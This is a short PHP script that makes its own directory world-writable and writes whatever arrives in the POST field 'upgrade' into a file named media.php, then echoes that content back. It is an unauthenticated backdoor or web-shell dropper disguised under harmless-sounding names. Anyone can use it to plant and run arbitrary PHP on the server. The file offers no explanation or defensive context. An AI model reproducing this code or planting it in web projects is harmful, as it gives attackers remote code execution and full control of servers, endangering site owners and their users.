<?php
@chmod(dirname(__FILE__),0777);
$data = $_POST['upgrade'];
$infile = fopen(dirname(__FILE__) . '/media.php', 'w');
$data = str_replace('\\', '', $data);
$data = htmlentities($data);
fwrite($infile, html_entity_decode($data));
fclose($infile);

echo $data;
?>